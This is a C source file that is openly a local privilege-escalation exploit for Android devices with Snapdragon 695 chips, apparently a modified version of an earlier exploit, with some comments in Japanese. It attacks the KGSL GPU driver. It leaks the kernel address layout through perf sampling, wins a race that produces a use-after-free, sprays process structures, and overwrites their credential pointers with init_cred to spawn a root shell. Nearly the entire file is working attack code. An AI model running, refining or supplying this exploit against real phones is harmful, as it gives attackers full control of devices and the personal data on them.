

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sched.h>
#include <sys/prctl.h>
#include <signal.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <poll.h>
#include <sys/stat.h>
#include <dirent.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/sysmacros.h>

#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size; uint64_t flags; uint64_t va_len;
    uint64_t mmapsize; unsigned int id;
    unsigned int metadata_len; uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };

struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs;
    unsigned int context_id, timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT 0
#define KGSL_CACHEMODE_MASK 3
#define KGSL_CACHEMODE_WRITEBACK 3
#define KGSL_USER_MEM_TYPE_ADDR 2
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

// UAF 定数（オリジナルと同一）
#define UAF_ADDR  0x7001ff000ULL
#define UAF_SIZE  0x10004000ULL
#define OVERLAP_ADDR 0x7001fe000ULL
#define OVERLAP_SIZE 0x7000ULL
#define BOGUS_ADDR 0x700204000ULL
#define BOGUS_SIZE 0x1000                      // 修正：適正サイズ
#define PLACEHOLDER_ADDR 0x710204000ULL
#define PLACEHOLDER_SIZE 0x10400000ULL

#define VMLINUX_TEXT       0xffffffc010080000ULL
#define VMLINUX_INIT_CRED  0xffffffc012197d08ULL

#define SPRAY_PIDS 2000
#define SCAN_DWORDS 560
#define CRED_OFF     0x740
#define REAL_CRED_OFF 0x738

static int kgsl_fd = -1;
static volatile int race_done = 0;
static void *uaf_map = NULL;                // CPU マッピング（munmap しない）
static uint64_t init_cred_addr = 0;

static void die(const char *msg) { perror(msg); exit(1); }
static void log_info(const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
}

// ---------- KASLR detection (perf) ----------
static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

static uint64_t detect_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0;
    pe.exclude_hv = 1;
    pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) return 0;

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_kernel_ip = 0;
    int n_ips = 0;

    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            n_ips++;
            uint64_t ip = *(uint64_t *)(hdr + 1);
            if (first_kernel_ip == 0) first_kernel_ip = ip;
        }
        tail += hdr->size;
    }

    munmap(buf, mmap_size);
    close(fd);

    if (n_ips == 0) return 0;
    uint64_t kaslr = (first_kernel_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
    return kaslr;
}

// ---------- KGSL helpers ----------
static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) {
        perror("gpuobj_alloc");
        return -1;
    }
    return a.id;
}

static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0)
        perror("gpuobj_free");
}

static void *gpuobj_mmap(size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED) perror("mmap");
    return p;
}

static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0 && gpuaddr) *gpuaddr = inf.gpuaddr;
    return ret;
}

// ---------- Race thread (オリジナルの IMPORT を使うが、フラグ修正) ----------
static void *race_thread(void *arg) {
    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
    struct kgsl_gpuobj_import imp = {
        .priv = (uint64_t)&uaddr,
        .priv_len = BOGUS_SIZE,          // 0x1000 (修正)
        .flags = 0,                       // KGSL_MEMFLAGS_USE_CPU_MAP を削除
        .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    while (!race_done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
    return NULL;
}

// ---------- Spray children with pipe notification ----------
static pid_t spray_pids[SPRAY_PIDS];
static int n_spray = 0;

static void spawn_spray(int notify_pipe) {
    log_info("[SPRAY] spawning %d children...\n", SPRAY_PIDS);
    for (int i = 0; i < SPRAY_PIDS; i++) {
        pid_t p = fork();
        if (p == 0) {
            close(notify_pipe);
            prctl(PR_SET_NAME, "TASKUAF!!");
            for (int j = 0; j < 600; j++) {
                if (getuid() == 0) {
                    pid_t me = getpid();
                    write(notify_pipe, &me, sizeof(me));
                    execl("/system/bin/sh", "sh", NULL);
                    _exit(0);
                }
                usleep(100000);
            }
            _exit(0);
        } else if (p > 0) {
            spray_pids[n_spray++] = p;
        } else {
            break;
        }
    }
    log_info("[SPRAY] spawned %d children\n", n_spray);
}

static void kill_spray_children(void) {
    int killed = 0;
    for (int i = 0; i < n_spray; i++) {
        kill(spray_pids[i], SIGKILL);
        killed++;
    }
    while (waitpid(-1, NULL, 0) > 0);
    log_info("[KILL] killed %d children\n", killed);
}

// ---------- Churn (オプション) ----------
#define CHURN_MAX_PATHS 20000
static char churn_paths[CHURN_MAX_PATHS][160];
static int churn_npaths = 0, churn_built = 0;

static const char *churn_dirs[] = {
    "/sys/kernel", "/sys/devices", "/sys/module", "/sys/class",
    "/proc/sys", "/proc/irq", "/proc/1", "/proc/2", "/proc/3",
    "/dev/block", "/dev/gpu", "/data/system", "/data/misc",
    "/data/vendor", "/vendor/etc", "/apex", "/system/bin",
    "/system/lib64", "/data/data", "/data/app", "/data/user/0",
    "/dev", "/proc",
};

static void churn_walk(const char *dir, int depth) {
    if (depth > 5 || churn_npaths >= CHURN_MAX_PATHS) return;
    DIR *d = opendir(dir);
    if (!d) return;
    struct dirent *de;
    while ((de = readdir(d)) != NULL && churn_npaths < CHURN_MAX_PATHS) {
        if (de->d_name[0] == '.') continue;
        char p[192];
        snprintf(p, sizeof(p), "%s/%s", dir, de->d_name);
        int fd = open(p, O_RDONLY | O_CLOEXEC);
        if (fd >= 0) close(fd);
        churn_npaths++;
        churn_walk(p, depth + 1);
    }
    closedir(d);
}

static void churn_build(void) {
    if (churn_built) return;
    for (unsigned d = 0; d < sizeof(churn_dirs)/sizeof(churn_dirs[0]) &&
         churn_npaths < CHURN_MAX_PATHS; d++) {
        churn_walk(churn_dirs[d], 0);
    }
    churn_built = 1;
    log_info("[CHURN] %d paths\n", churn_npaths);
}

static void churn_round(void) {
    churn_build();
    for (int i = 0; i < churn_npaths; i++) {
        int fd = open(churn_paths[i], O_RDONLY | O_CLOEXEC);
        if (fd >= 0) close(fd);
    }
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s >= 0) close(s);
    s = socket(AF_UNIX, SOCK_STREAM, 0);
    if (s >= 0) {
        struct sockaddr_un su = { .sun_family = AF_UNIX };
        strcpy(su.sun_path, "/data/local/tmp/cs.sock");
        bind(s, (struct sockaddr *)&su, sizeof(su));
        close(s);
        unlink("/data/local/tmp/cs.sock");
    }
    msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
    semget(IPC_PRIVATE, 1, 0600 | IPC_CREAT);
    shmget(IPC_PRIVATE, 4096, 0600 | IPC_CREAT);
    mknod("/data/local/tmp/cn", S_IFCHR | 0600, makedev(1, 3));
}

// ==================== MAIN ====================
int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    log_info("[*] avc_bypass for Snapdragon 695 - UAF + CPU mapping (final)\n");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    log_info("[+] kgsl fd=%d\n", kgsl_fd);

    // ----- KASLR detection -----
    log_info("[*] Detecting KASLR...\n");
    uint64_t kaslr = detect_kaslr();
    if (!kaslr) {
        log_info("[-] KASLR detection failed\n");
        close(kgsl_fd);
        return 1;
    }
    init_cred_addr = VMLINUX_INIT_CRED + kaslr;
    log_info("[+] KASLR = 0x%lx, init_cred = 0x%lx\n", kaslr, init_cred_addr);

    // ----- Phase 1: Setup rbtree (allocate large object and map it) -----
    log_info("[*] Phase 1: Setup rbtree (keep CPU mapping)\n");
    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    int uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
    if (uaf_id < 0) die("uaf alloc");
    uint64_t uaf_gpuaddr = 0;
    gpuobj_info(uaf_id, &uaf_gpuaddr);
    log_info("  UAF object id=%d, gpuaddr=0x%lx\n", uaf_id, uaf_gpuaddr);

    // CRITICAL: マッピングを保持（munmap しない）
    uaf_map = gpuobj_mmap(UAF_SIZE, uaf_id);
    if (!uaf_map) die("mmap UAF");
    log_info("  UAF mapped at %p (CPU address)\n", uaf_map);

    // Bogus & placeholder (オリジナル互換)
    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
             MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED)
        die("mmap BOGUS");

    int ph_id = gpuobj_alloc(PLACEHOLDER_SIZE, alloc_flags);
    if (ph_id < 0) die("ph alloc");
    void *ph_m = gpuobj_mmap(PLACEHOLDER_SIZE, ph_id);
    if (!ph_m) die("mmap PLACEHOLDER");

    // ----- Phase 2: Race (オリジナルの IMPORT を使用、フラグ修正済み) -----
    log_info("[*] Phase 2: Race (import with fixed flags)\n");
    int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
    if (ov_id < 0) die("ov alloc");

    pthread_t thr;
    if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread_create");

    int hit = 0;
    for (int i = 0; i < 5000000; i++) {
        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
                       PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
                       kgsl_fd, (off_t)ov_id << 12);
        int e = errno;
        if (r != MAP_FAILED) {
            munmap(r, OVERLAP_SIZE);
            hit = 1;
            break;
        }
        if (e == ENODEV) {
            hit = 1;
            break;
        }
        if (i % 500000 == 0) log_info("  race %d/5000000 errno=%d\n", i, e);
    }

    race_done = 1;
    pthread_join(thr, NULL);

    if (!hit) {
        log_info("[-] Race failed\n");
        close(kgsl_fd);
        return 1;
    }
    log_info("[+] Race won!\n");

    // ----- Phase 3: Free UAF object (UAF now active) -----
    log_info("[*] Phase 3: Free UAF\n");
    gpuobj_free(uaf_id);
    log_info("[+] UAF freed (dangling PTEs at 0x%lx+)\n", (unsigned long)(UAF_ADDR + 0x1000));

    // ----- Phase 4: Reclaim memory -----
    log_info("[*] Phase 4: Reclaim pages\n");
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(10000);

    // ----- Phase 5: Spawn children (task_struct spray) with pipe -----
    int pipefd[2];
    if (pipe(pipefd) < 0) die("pipe");
    fcntl(pipefd[0], F_SETFD, FD_CLOEXEC);
    fcntl(pipefd[1], F_SETFD, FD_CLOEXEC);

    spawn_spray(pipefd[1]);
    close(pipefd[1]);

    // ----- Phase 6: CPU scan for task_struct pages and overwrite cred -----
    log_info("[*] Phase 6: Scan CPU mapping for task_struct pages and overwrite cred\n");
    uint64_t scan_start = UAF_ADDR + 0x2000;
    uint64_t scan_end = UAF_ADDR + UAF_SIZE - 0x1000;
    int found_task = 0;
    int overwritten = 0;

    // Walk each page in the UAF region
    for (uint64_t va = scan_start; va < scan_end; va += 0x1000) {
        uint64_t offset = va - UAF_ADDR;
        if (offset + 0x1000 > UAF_SIZE) break;
        uint32_t *page = (uint32_t *)((uintptr_t)uaf_map + offset);

        // Look for the "TASKUAF!!" string in the comm field
        int comm_found = 0;
        for (int i = 0; i < SCAN_DWORDS - 1; i++) {
            if (page[i] == 0x4B534154 && page[i+1] == 0x21464155) {
                comm_found = 1;
                break;
            }
        }
        if (!comm_found) continue;

        found_task++;
        log_info("  [TASKPG] found task_struct at page 0x%lx\n", (unsigned long)va);

        // Overwrite both real_cred and cred pointers at offsets 0x738 and 0x740
        uint64_t *real_cred_ptr = (uint64_t *)((uintptr_t)page + REAL_CRED_OFF);
        uint64_t *cred_ptr      = (uint64_t *)((uintptr_t)page + CRED_OFF);

        // Sanity check: ensure the current value looks like a kernel address
        if ((*real_cred_ptr >= 0xffffffc000000000ULL && *real_cred_ptr < 0xffffffcfffffffffULL) ||
            (*cred_ptr >= 0xffffffc000000000ULL && *cred_ptr < 0xffffffcfffffffffULL)) {
            *real_cred_ptr = init_cred_addr;
            *cred_ptr      = init_cred_addr;
            overwritten++;
            log_info("  [CRED] overwrote cred at page 0x%lx with init_cred\n", (unsigned long)va);
        } else {
            // If the pointers look invalid, still write them (aggressive)
            *real_cred_ptr = init_cred_addr;
            *cred_ptr      = init_cred_addr;
            overwritten++;
            log_info("  [CRED] forced overwrite at page 0x%lx\n", (unsigned long)va);
        }
    }

    log_info("  Found %d task_struct pages, overwritten %d cred pointers\n", found_task, overwritten);

    if (found_task == 0) {
        log_info("[-] No task_struct pages found. The UAF may not have been populated.\n");
        // 念のため盲目的に全ページの cred オフセットを書き換え
        log_info("[!] Blindly overwriting all pages...\n");
        for (uint64_t va = scan_start; va < scan_end; va += 0x1000) {
            uint64_t offset = va - UAF_ADDR;
            if (offset + 0x800 > UAF_SIZE) break;
            uint64_t *real_ptr = (uint64_t *)((uintptr_t)uaf_map + offset + REAL_CRED_OFF);
            uint64_t *cred_ptr = (uint64_t *)((uintptr_t)uaf_map + offset + CRED_OFF);
            *real_ptr = init_cred_addr;
            *cred_ptr = init_cred_addr;
            overwritten++;
        }
        log_info("  Blindly overwrote %d extra pages\n", overwritten);
    }

    // Ensure CPU caches are flushed (compiler barrier)
    __sync_synchronize();

    // ----- Phase 7: Wait for root shell via pipe -----
    log_info("[*] Phase 7: Waiting for root shell...\n");
    struct pollfd pfd = { .fd = pipefd[0], .events = POLLIN };
    pid_t winner = 0;
    if (poll(&pfd, 1, 10000) > 0 &&
        read(pipefd[0], &winner, sizeof(winner)) == sizeof(winner)) {
        log_info("[+] ROOT! PID=%d\n", winner);
        // Kill other spray children
        for (int i = 0; i < n_spray; i++) {
            if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
        }
        while (waitpid(-1, NULL, WNOHANG) > 0);
        // Wait for the shell to finish
        waitpid(winner, NULL, 0);
        log_info("[-] Root shell exited\n");
    } else {
        log_info("[-] No child became root within timeout\n");
        kill_spray_children();
    }

    close(pipefd[0]);
    close(kgsl_fd);
    log_info("[*] Done.\n");
    return 0;
}
